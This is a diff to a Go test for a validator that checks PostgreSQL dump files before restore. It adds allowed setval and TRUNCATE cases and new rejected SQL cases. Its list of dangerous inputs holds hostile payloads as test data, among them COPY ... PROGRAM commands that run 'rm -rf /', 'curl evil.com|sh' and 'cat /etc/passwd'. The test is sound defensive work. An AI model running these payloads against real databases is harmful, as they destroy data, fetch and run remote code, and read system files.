@@ -39,6 +39,13 @@ func TestRestoreTables_Validation(t *testing.T) {
 	// --- valid data-only dumps must pass the validator (psql then fails: no DB) ---
 
 	passes := map[string]string{
+		// The whole-database dump restores sequence counters and clears the tables
+		// before reloading; both must pass the allowlist.
+		"setval sequence": "-- PostgreSQL database dump\n" +
+			"SELECT pg_catalog.setval('public.a_seq', 42, true);\n",
+		"truncate prefix then header": "TRUNCATE public.users, public.profiles, public.\"media_items\";\n" +
+			"-- PostgreSQL database dump\n" +
+			"COPY public.users (id) FROM stdin;\n\\.\n",
 		"header + SET":    "-- PostgreSQL database dump\n\nSET statement_timeout = 0;\n",
 		"leading comment": "--\n-- PostgreSQL database dump\n--\n\nSET statement_timeout = 0;\n",
 		"full data-only grammar": "-- PostgreSQL database dump\n" +
@@ -97,6 +104,9 @@ func TestRestoreTables_Validation(t *testing.T) {
 	// --- the disallowed-statement allowlist closes every known RCE/file vector ---
 
 	dangerous := map[string]string{
+		"TRUNCATE CASCADE":        "TRUNCATE users CASCADE;",
+		"setval trailing SQL":     "SELECT pg_catalog.setval('x', 1); DROP TABLE y;",
+		"setval subquery value":   "SELECT pg_catalog.setval('x', (SELECT max(id) FROM users));",
 		"COPY TO PROGRAM":                "COPY users TO PROGRAM 'rm -rf /';",
 		"COPY FROM PROGRAM":              "COPY users FROM PROGRAM 'curl evil.com|sh';",
 		"COPY FROM PROGRAM lowercase":    "copy secrets from program 'cat /etc/passwd';",
